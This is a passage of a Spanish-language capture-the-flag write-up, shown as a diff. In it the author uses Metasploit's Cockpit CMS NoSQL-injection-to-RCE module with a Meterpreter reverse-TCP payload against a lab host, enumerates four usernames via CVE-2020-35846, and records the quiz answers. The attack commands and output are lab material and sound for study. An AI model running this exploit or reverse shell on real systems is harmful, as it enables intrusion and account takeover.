@@ -60,3 +60,86 @@ Viendo el código del exploit puedo responder a la quinta pregunta.
 
 What is the path that allows you to change user account passwords?
 /auth/resetpassword
+
+Miro también en msfconsole, ya que los exploits varían, y encuentro otro, lo configuro y pruebo la explotación.
+
+
+msf > search cockpit
+
+Matching Modules
+================
+
+   #  Full Name                           Disclosure Date  Rank    Check  Name
+   -  ---------                           ---------------  ----    -----  ----
+   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce
+
+msf > use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+
+msf exploit(multi/http/cockpit_cms_rce) > show options
+
+Module options (exploit/multi/http/cockpit_cms_rce):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   ENUM_USERS  true             no        Enumerate users
+   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]. Supported prox
+                                          ies: sapni, socks4, http, socks5, socks5h
+   RHOSTS                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
+                                          sics/using-metasploit.html
+   RPORT       80               yes       The target port (TCP)
+   SSL         false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI   /                yes       The URI of Cockpit
+   USER                         no        User account to take over
+   VHOST                        no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.37     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(multi/http/cockpit_cms_rce) > set rhosts 10.128.189.88
+rhosts => 10.128.189.88
+msf exploit(multi/http/cockpit_cms_rce) > set lhost tun0
+lhost => 192.168.131.65
+msf exploit(multi/http/cockpit_cms_rce) > run
+[*] Started reverse TCP handler on 192.168.131.65:4444 
+[*] Attempting Username Enumeration (CVE-2020-35846)
+[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
+[-] Exploit aborted due to failure: bad-config: 10.128.189.88:80 - User to exploit required
+[*] Exploit completed, but no session was created.
+
+Ha fallado, pero me ha dado datos importantes, 4 usuarios.
+
+Esta es la respuesta a la cuarta pregunta.
+
+How many users can you identify when you reproduce the user enumeration attack?
+4.
+
+Y me dice como ha realizado la enumeración. 
+[*] Attempting Username Enumeration (CVE-2020-35846)
+
+Viendo el código del exploit consigo la respuesta a la tercera pregunta.
+
+login_req = session.post(url + "/auth/check" , json=login_data)
+
+What is the path that allow user enumeration?
+/auth/check
+
